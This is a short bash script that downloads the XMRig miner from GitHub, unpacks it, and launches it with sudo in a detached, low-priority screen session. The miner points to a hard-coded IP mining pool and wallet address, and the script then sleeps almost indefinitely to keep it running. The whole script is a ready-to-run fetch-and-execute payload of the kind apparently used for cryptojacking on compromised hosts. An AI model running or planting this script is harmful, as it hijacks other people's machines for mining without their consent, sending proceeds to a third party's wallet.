#!/bin/bash

curl https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz -L -O -J
tar -xf xmrig-6.20.0-linux-x64.tar.gz
cd ./xmrig-6.20.0
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o 47.89.234.100:2222 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p x --cpu-max-threads-hint 80 --randomx-1gb-pages
sleep 9999999999
